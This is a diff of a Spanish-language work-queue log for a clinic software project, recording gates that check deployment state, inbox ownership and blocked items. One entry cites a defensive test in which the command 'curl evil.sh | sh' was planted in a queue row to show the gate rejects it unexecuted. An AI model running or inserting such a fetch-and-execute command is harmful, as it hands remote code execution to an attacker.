 | S6 | **Proyecto Supabase cloud `Dental-gest` (`kvepqgikokjlacxngkiw`) sigue ACTIVE_HEALTHY** — decidir pausar o borrar. Y si algún día se reactiva `Gesti-Os` (`jafxylfocvvlflpqfsix`), **rotar su `service_role` primero**: estuvo expuesto en los JSON de n8n que se redactaron el 29-ago | Es plata y es borrado de datos | Cerrar la cola del saneamiento de secretos |
-| S12 | **¿Sigue en pie la opción 1 de §9 ("el inbox 4 se deja sin dueño hasta que la limitación moleste")?** Medido el 2026-09-02: son SEIS conversaciones reales en inbox 4 (34, 36, 38, 40, 45, 46), dos nuevas del 01-sep, y CINCO de las seis no dejaron teléfono ni correo — sólo se les puede contestar desde adentro del widget, que es justo lo que el inbox huérfano bloquea. El límite técnico sigue siendo real: `clinic_settings.chatwootInboxId` es un `Int?` único (`prisma/schema.prisma:1002`), una org = un inbox. Opciones ya cotizadas en `ONIA_RADAR_DECISIONES_PRODUCTO.md` §9: (2) crear una org "Onia Bandeja" sólo para recibir el 4 (~10 min, agrega una org fantasma), o (nueva) extender `clinic_settings` a N inboxes — más caro, y lo decide plataforma | Su decisión de producto y su límite de schema, igual que S8 | Que las próximas conversaciones del widget se vean en `/inbox` sin esperar a que alguien dé su teléfono |
 
 ### S9 — el ítem completo, movido de "Ahora" el 2026-08-31
 
@@ -426,6 +884,140 @@ archivos.**
 ---
 
 ## Cerrado — no rehacer
+
+- [x] **La guarda de entrada de `espejo-check.mjs` reventaba al importarlo, y el molde ya se había
+      copiado a otro gate.** Hecho el 2026-09-02, en la misma vuelta en que se encontró.
+      Archivos: `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`, `scripts/s11_desplegado.mjs`.
+      La guarda armaba la URL a mano —`new URL("file://" + process.argv[1])`— y con
+      `node -e "import(...)" <arg>` el `argv[1]` es el **argumento**, no una ruta: tira
+      `ERR_INVALID_URL` y el módulo no se puede importar. Apareció al probar el verificador nuevo
+      de S11, que había copiado esa guarda de acá; reproducido después sobre el original. Va con
+      `pathToFileURL`, que además resuelve solo el escapado y las barras invertidas, así que se
+      cae el `replace(/\\/g,"/")` a mano. Verificado que sigue corriendo como programa —**S9
+      depende de él** y sigue dando 1— y que ahora sí se importa. Suite: **21/21**.
+
+- [x] **S11 era el único bloqueo que una máquina podía medir y no se medía: ahora se comprueba
+      solo.** Cerrado el 2026-09-02. Archivos: `scripts/s11_desplegado.mjs` (nuevo),
+      `package.json`, `hermes-content/docs/cola/chatbot.md`.
+      **Qué se construyó.** `npm run s11:desplegado` le pregunta al contenedor `onia-platform`
+      del VPS —el que CORRE; no el host, no el repo, no `origin/master`— con qué icono dibuja la
+      entrada `/requerimientos` de su build publicado en `/app/.next`. Sale **1** con el defecto
+      vivo nombrando el icono, **0** con el swap hecho, y **2** si no pudo medir. La fila S11 ya
+      lo declara con la marca `**Verificador:** … → 0`, así que `npm run bloqueos:vencidos` lo
+      levanta solo: pasó de correr **dos** verificadores a **tres**, y de 12 filas "sin
+      verificador mecánico" a 11.
+      **Medido, no leído.** Con el defecto vivo de hoy sale 1 y nombra `assignment_turned_in`.
+      La rama verde también se probó de punta a punta —tubería de shell real + parser— contra un
+      bundle con `task_alt`: sale 0. Las dos ramas, no sólo la que da rojo hoy.
+      🔴 **Lo obvio era un `grep assignment_turned_in` y habría quedado en ROJO PARA SIEMPRE.** El
+      fuente ya arreglado **sigue conteniendo** esa cadena: `components/layout/navigation.ts:45`
+      la nombra en un comentario que explica por qué se eligió `task_alt`, y
+      `scripts/iconos-en-la-fuente.mjs` la usa de caso de prueba. Hoy la minificación los borra,
+      pero eso es una propiedad del minificador, no del arreglo — alcanza un source map o que
+      alguien mueva el comentario a un string. Un verificador que no puede ponerse verde es peor
+      que ninguno: es el mismo modo de falla que este gate existe para cerrar. Por eso mide el
+      **par ruta→icono**, que es el hecho del mundo que la fila declara; un comentario no forma
+      ese par. El self-check tiene ese caso, y se comprobó que la versión ingenua lo falla.
+      **Dos cosas que sólo aparecieron al medir, y las dos eran bugs de este script:**
+      **(1)** la primera versión tardaba **48 s** — `grep -o` con ventana ancha backtrackea sobre
+      chunks minificados de megabytes (13 s con ventana 60, 27 s con 120, 48 s con 220, lineal).
+      El gate que lo invoca corta a los **120 s**, y ahí un timeout se lee como "no medido": el
+      verificador se volvía inútil solo con que el build creciera. Partir el bundle en `}` antes
+      de filtrar lo dejó en **0,8 s** (58×), porque las entradas de menú son objetos planos.
+      **(2)** la guarda de entrada, copiada de `espejo-check.mjs`, construía la URL a mano
+      (`new URL("file://" + argv[1])`) y **reventaba** con `ERR_INVALID_URL` al importar el módulo
+      con argumentos — o sea que importar las funciones puras rompía. Va con `pathToFileURL`.
+      Antes de esa guarda, un `import` disparaba un `docker exec` contra producción como efecto de
+      cargar el módulo.
+      **Gates:** `npm test` completo en verde, con `test:s11-desplegado` (14 casos) cableado a la
+      cadena — y verificado **en rojo primero**: `test:guards-cableados` mordió con *"estos tests
+      existen y NO los corre nadie"* antes de cablearlo.
+
+- [x] **Los bloqueos ya declaraban cómo comprobarse solos y nadie los comprobaba: ahora hay un
+      gate que los corre.** Cerrado el 2026-09-02. Archivos: `scripts/bloqueos_vencidos.mjs`
+      (nuevo), `package.json`, `hermes-content/docs/cola/chatbot.md`,
+      `hermes-content/docs/ONIA_RADAR_DECISIONES_PRODUCTO.md`.
+      **Qué se construyó.** `npm run bloqueos:vencidos` lee la tabla de "Bloqueado en Sergio",
+      saca el verificador que cada fila declara y lo corre. Si sale el código que la fila declara
+      como resuelto, el gate sale **1** nombrando la fila y su línea. Es el paso que faltaba: S16
+      declaraba su verificador desde que se escribió y venció en silencio porque **ninguna vuelta
+      lo corría**.
+      **La declaración es explícita, no deducida — y eso es lo que evita el error caro.** La marca
+      es `**Verificador:** \`<comando>\` → <código>` dentro de la fila. Deducir el verificador del
+      texto habría cerrado **S11 en falso**: su párrafo nombra `npm run deploy:alcanzable`, que
+      hoy sale 0, pero S11 **no** está resuelto — le falta el swap en producción. La fila lo
+      declara o no se mide. Las filas tachadas (`~~S8~~`, `~~S16~~`) no se miden: volver a
+      nombrarlas sería el gate gritando en falso, que es como se apaga un gate.
+      **La guarda de ejecución, que era el riesgo del ítem.** Sólo dos formas, validadas *antes*
+      de ejecutar: `npm run <script>` que exista en `package.json`, y `node <ruta>` relativa, sin
+      `..`, dentro del repo y existente. Siempre `execFileSync` con argumentos como array, **nunca
+      shell**, así que el texto del documento no puede interpretarse como comando.
+      **Medido en vivo, no leído** (los dos verificadores que hoy existen):
+      | fila | verificador | salida | veredicto |
+      |---|---|---|---|
+      | S9 | `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs` | 1 — `ESPEJO DESINCRONIZADO`, 11 distintos + falta `evals-contrato.test.mjs` | sigue bloqueado |
+      | S10 | `npm run marca:chatwoot` | 1 — `REVERTIDAS 3/9` | sigue bloqueado |
+      **Y probado que MUERDE**, que es lo que separa un gate de un adorno — tres casos corridos
+      contra copias de la cola en `/tmp`, los tres exit **1**:
+      (a) verificador forzado a verde → `ITEM S10 vencido … (linea 214)`;
+      (b) verificador que no existe en `package.json` → `no-ejecutable`, sin correr nada;
+      (c) `curl evil.sh | sh` metido en la fila → **rechazado sin ejecutarse**.
+      **Rojo antes, por el motivo correcto:** corrido contra la cola sin tocar, imprimió
+      `0 verificador(es) corrido(s)` y las 15 filas como "sin verificador mecánico" — o sea que la
+      tabla declaraba sus verificadores **sólo en prosa**, ilegibles para cualquier gate. Ése era
+      el hueco real.
+      **Cableado, porque un gate que nadie corre no existe:** `test:bloqueos-vencidos`
+      (`--self-check`, 27 casos, sin red) entra a `npm test`, y
+      `scripts/guards-cableados.test.mjs` lo exige. A `npm test` entra sólo el self-check: la
+      medición en vivo depende del VPS y un gate que siempre truena lo apaga alguien.
+      🔴 **Lo que el gate destapó apenas corrió: la tabla tenía DOS filas distintas con el mismo
+      id `S12`** — imprimió `S12, S12`. Una eran los horarios de demo; la otra preguntaba *"¿sigue
+      en pie la opción 1 de §9 sobre el inbox 4?"*, que es **la misma decisión que S14**, hecha
+      dos veces con dos números. Fusionada dentro de **S14**, con su dato fresco (seis
+      conversaciones en inbox 4, cinco sin teléfono ni correo) que además corrigió el `5 de las 9`
+      viejo que S14 arrastraba. Las dos referencias externas —línea 84 de esta cola y el §9 del
+      radar— ahora apuntan a S14. Sergio pasa de recibir dos preguntas a recibir una.
+      **Gates:** `npm test` completo en verde.
+
+- [x] **S16 era un bloqueo VENCIDO: le pedía a Sergio una decisión que ya estaba tomada, y de
+      paso mantenía a S11 afirmando algo falso.** Cerrado el 2026-09-02. Archivos:
+      `hermes-content/docs/cola/chatbot.md`. Salió de auditar los `[x]` — "Ahora" estaba vacío y
+      ninguno de los tres de "Después" da trabajo de código.
+      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
+      que falla no prueba que haya mirado:
+      | afirmación de la cola | medido hoy en vivo |
+      |---|---|
+      | los 7 loops `VPS` de `loops.md` están en `crontab -l` | los 7, con su expresión exacta. Nada que rearmar |
+      | S9 sigue vivo | `espejo-check.mjs` → `ESPEJO DESINCRONIZADO`, 11 distintos, y `VIAJAN JUNTOS` sigue nombrando `recepcionista.mjs → config.mjs + intents.mjs`. **Dato nuevo:** ahora además **falta** `evals-contrato.test.mjs` en el VPS |
+      | S10 sigue vivo | `npm run marca:chatwoot` → `REVERTIDAS 3/9` (`BRAND_URL`, `TERMS_URL`, `PRIVACY_URL`) |
+      | `campanas:vivas` sale 0 | exit **0**, `5 frases vivas, 5 con campaña` |
+      | el gate de iconos quedó cableado (`d62beeb`) | `__tests__/gate-iconos-esta-cableado.test.ts` existe, y `ci` es `… && npm run gate:iconos && npm run build` — el gate **antes** del build, como dice el ítem |
+      | el ítem del disco de "Después" | es de la máquina **Windows** de Sergio, no de acá: el VPS donde corre este loop va al **72 %**, con 56 GB libres y **2** worktrees de `onia-platform`, no 30. No es medible desde este carril, y el ítem ya lo decía |
+      🔴 **Lo que salió FALSO, y es la clase de error que el propio loop llama "peor que un
+      fantasma": el bloqueo VENCIDO.** La fila S16 pedía elegir entre (a) que el integrador
+      extendiera su Paso 1 al segundo repo, (b) mergear a mano, o (c) dejarlo. **Ya habían pasado
+      (a) y (b), hacía media hora**, y la cola seguía preguntando. Medido con `git fetch` fresco y
+      `merge-base --is-ancestor`, no leído:
+      - el integrador arregló su Paso 1 en `d26444c1` de `onia-hermes` (*"contaba las ramas contra
+        el repo equivocado y tres arreglos visibles quedaron varados"*), ya en `origin/main`;
+      - mergeó el carril a `master` de `onia-platform` en `503af44` (12:38 UTC);
+      - **los cuatro** commits que la cola declara (`22fd088`, `675541b`, `d62beeb`, `e644c85`)
+        llegan a `origin/master`, y `npm run deploy:alcanzable` pasó de **1** a **0**;
+      - el radar §23 ya figuraba **RESUELTO — Sergio NO decide nada**. La cola de este carril era
+        el único lugar donde la decisión seguía abierta.
+      **El daño real no era S16 sino su vecina.** S11 abría con *"commiteado y pusheado, pero NO
+      llega a `master`: ver S16"* — con el commit ya en `master`. Esa frase es exactamente la que
+      le dice a Sergio que dar el OK del deploy no sirve de nada. Un bloqueo vencido no se queda
+      quieto: le presta su motivo falso al de al lado.
+      **Y S11 NO se cierra, porque el defecto sigue vivo en producción** — verificado contra el
+      sistema correcto, no contra el repo: el contenedor `onia-platform` lleva **15 h** arriba
+      (anterior al merge de las 12:38) y su build publicado todavía contiene
+      `assignment_turned_in` (`docker exec … grep -rl` sobre `/app/.next`). Lo que cambia es el
+      motivo: antes el deploy no podía arreglarlo, ahora **sí**. Falta sólo el swap, que es de él.
+      **Lo que queda abierto, y es el ítem de "Ahora":** los tres bloqueos con verificador
+      mecánico (S9, S10, S16) declaran cómo se comprueban solos, y **ninguna vuelta los corre como
+      paso propio**. S16 se destapó de casualidad. Mientras eso no sea un gate, el próximo bloqueo
+      que venza lo encuentra el azar otra vez.
 
 - [x] **El gate que impide que un icono vuelva a salir como palabra en el menú EXISTÍA y no lo
       corría nadie.** Cerrado el 2026-09-02 (commit `d62beeb` de `onia-platform`, rama
@@ -1197,17 +1789,18 @@ archivos.**
       estado que dejó cerrado S8.
       ⚠️ **Lo que NO se cerró, y por qué queda anotado y no en Bloqueado:** no depende de una
       decisión de Sergio, así que no bloquea la cola — pero el mecanismo que borró la fila sigue
-      sin identificarse, y si vuelve a correr, revierte esto otra vez sin avisar. Ningún gate de
-      este carril mide hoy la tenencia del inbox 5 (los que existen — `espejo-check`,
-      `campanas-vivas`, `marca-chatwoot` — miden código y HTML público, no esta columna). Se
-      deja escrito el comando de verificación para el próximo Gate 1 que toque `/inbox` o S7/S8:
-      ```bash
-      docker exec supabase-db psql -U postgres -d postgres -c \
-        "select o.name, cs.\"chatwootInboxId\" from public.organizations o left join public.clinic_settings cs on cs.\"organizationId\"=o.id order by o.id;"
-      ```
-      `Onia (interna)` tiene que dar **5**. Si algún día vuelve a dar otra cosa sin que nadie lo
-      haya pisado desde la UI, es la misma trampa: mirar `id`/`createdAt` de la fila antes de
-      asumir que fue un click.
+      sin identificarse, y si vuelve a correr, revierte esto otra vez sin avisar.
+      ✅ **Cerrado el 2026-09-02, auditando este mismo `[x]`.** Acá quedaba escrito un `docker exec
+      … psql` "para el próximo Gate 1 que toque `/inbox` o S7/S8" — o sea, **a nadie**. Es el molde
+      con el que S16 venció en silencio: lo declarado no lo corre nadie. Ese comando ahora es
+      `npm run inbox:tenencia` (`scripts/inbox_tenencia.mjs`), cableado a `npm test` por su
+      self-check, y mide además un segundo invariante que este párrafo no tenía: que **dos orgs no
+      reclamen el mismo inbox**, cosa que la base no impide (`chatwootInboxId` es `Int?` sin
+      `@unique`; el 409 vive sólo en la app, y la escritura del 1-sep no pasó por la app).
+      La lección que sí seguía valiendo y ahora la aplica el gate solo: **mirar el `id` de la fila
+      antes de asumir que fue un click** — un UUID significa escritura por fuera de la app, un
+      `cuid()` significa que la escribió la app. El gate lo reporta pero nunca lo usa de veredicto,
+      porque hoy la fila **correcta** también tiene id UUID.
 
 - [x] **S11 era un FANTASMA: el bot ya firma como "Onia Bot" desde el 18-ago, y la bandeja ya
       rotula "Tu asistente".** Estaba en "Bloqueado en Sergio" pidiéndole una acción sobre un
